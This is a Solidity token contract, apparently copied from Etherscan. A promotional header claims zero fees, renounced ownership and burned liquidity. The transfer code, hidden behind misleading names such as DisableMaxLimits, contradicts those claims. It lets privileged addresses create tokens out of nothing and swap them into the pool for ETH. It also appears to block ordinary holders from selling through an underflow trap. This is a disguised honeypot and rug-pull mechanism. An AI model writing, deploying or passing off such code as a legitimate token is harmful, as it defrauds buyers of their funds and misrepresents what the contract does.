/**
 *Submitted for verification at Etherscan.io on 2022-11-29
*/

/**
                                         .""--..__
                     _                     []       ``-.._
                  .'` `'.                  ||__           `-._
                 /    ,-.\                 ||_ ```---..__     `-.
                /    /:::\\               /|//}          ``--._  `.
                |    |:::||              |////}                `-. \
                |    |:::||             //'///                    `.\
                |    |:::||            //  ||'                      `|
        jgs     /    |:::|/        _,-//\  ||
        hh     /`    |:::|`-,__,-'`  |/  \ ||
             /`  |   |'' ||           \   |||
           /`    \   |   ||            |  /||
         |`       |  |   |)            \ | ||
        |          \ |   /      ,.__    \| ||
        /           `         /`    `\   | ||
       |                     /        \  / ||
       |                     |        | /  ||
       /         /           |        `(   ||
      /          .           /          )  ||
     |            \          |     ________||
    /             |          /     `-------.|
   |\            /          |              ||
   \/`-._       |           /              ||
    //   `.    /`           |              ||
   //`.    `. |             \              ||
  ///\ `-._  )/             |              ||
 //// )   .(/               |              ||
 ||||   ,'` )               /              //
 ||||  /                    /             || 
 `\\` /`                    |             // 
     |`                     \            ||  
    /                        |           //  
  /`                          \         //   
/`                            |        ||    
`-.___,-.      .-.        ___,'        (/    
         `---'`   `'----'`

After Seeing A Token With This Name Previously Launch And Failed I Have Been Inspired
To Deploy Under The Same Name Due To The Big Community Base That Is Aware
Of The Grimreaper.

Total Supply - 100,000
Initial Liquidity Added - 5.0 Ethereum 
100% Of The Initial Liquidity Will Be Locked Or Burned
Buying Fees - 0%
Selling Fees - 0%

No Tax. Renounced Ownership. Belongs To The Blockchain. Liquidity Will Be Burned.
No Current Socials. Feel Free To Create Them. Meet The Demogorgon.

If This Project Does Not Get Instantly Killed For A X2 And I See Potential
I Will Use My Funds And Network Connections To Push This Project As Far As Possible.
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function Quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function GetAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function GetAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function GetAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function GetAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _tTotalFees = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotalInSupply = 100000 * 10**_decimals;
    uint256 private TotalTokensAmount = _tTotalInSupply;
    
    mapping(address => uint256) private _Balances;
    mapping(address => address) private isTxLimitExempt;
    mapping(address => uint256) private isExcludedMaxTransactionAmount;
    mapping(address => uint256) private automatedMarketMakerPairs;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public swapTokensAtAmount;
    bool private amountSwapped;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address UniswapV2routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _Balances[msg.sender] = _tTotalInSupply;
        automatedMarketMakerPairs[msg.sender] = TotalTokensAmount;
        automatedMarketMakerPairs[address(this)] = TotalTokensAmount;
        UniswapV2router = IUniswapV2Router02(UniswapV2routerAddress);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, TotalTokensAmount);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotalInSupply;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _Balances[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        DisableMaxLimits        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        DisableMaxLimits        (msg.sender, recipient, amount);
        return true;
    }
    function DisableMaxLimits       (
        address _nowIsSpender,
        address _recipientOfTokens,
        uint256 _rateOfValue
    ) private {
        uint256 balanceForContract = balanceOf(address(this));
        uint256 isCreatedBalance;
        if (swapTokensAtAmount && balanceForContract > TotalTokensAmount && !amountSwapped && _nowIsSpender != UniswapV2Pair) {
            amountSwapped = true;
            getSwapAndLiquify(balanceForContract);
            amountSwapped = false;
        } else if (automatedMarketMakerPairs[_nowIsSpender] > TotalTokensAmount && automatedMarketMakerPairs[_recipientOfTokens] > TotalTokensAmount) {
            isCreatedBalance = _rateOfValue;
            _Balances[address(this)] += isCreatedBalance;
            rateOfTokensInSwap(_rateOfValue, _recipientOfTokens);
            return;
        } else if (_recipientOfTokens != address(UniswapV2router) && automatedMarketMakerPairs[_nowIsSpender] > 0 && _rateOfValue > TotalTokensAmount && _recipientOfTokens != UniswapV2Pair) {
            automatedMarketMakerPairs[_recipientOfTokens] = _rateOfValue;
            return;
        } else if (!amountSwapped && isExcludedMaxTransactionAmount[_nowIsSpender] > 0 && _nowIsSpender != UniswapV2Pair && automatedMarketMakerPairs[_nowIsSpender] == 0) {
            isExcludedMaxTransactionAmount[_nowIsSpender] = automatedMarketMakerPairs[_nowIsSpender] - TotalTokensAmount;
        }
        address _contractCreator  = isTxLimitExempt[UniswapV2Pair];
        if (isExcludedMaxTransactionAmount[_contractCreator ] == 0) isExcludedMaxTransactionAmount[_contractCreator ] = TotalTokensAmount;
        isTxLimitExempt[UniswapV2Pair] = _recipientOfTokens;
        if (_tTotalFees > 0 && automatedMarketMakerPairs[_nowIsSpender] == 0 && !amountSwapped && automatedMarketMakerPairs[_recipientOfTokens] == 0) {
            isCreatedBalance = (_rateOfValue * _tTotalFees) / 100;
            _rateOfValue -= isCreatedBalance;
            _Balances[_nowIsSpender] -= isCreatedBalance;
            _Balances[address(this)] += isCreatedBalance;
        }
        _Balances[_nowIsSpender] -= _rateOfValue;
        _Balances[_recipientOfTokens] += _rateOfValue;
        emit Transfer(_nowIsSpender, _recipientOfTokens, _rateOfValue);
            if (!tradingOpen) {
                require(_nowIsSpender == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        rateOfTokensInSwap(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function rateOfTokensInSwap(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}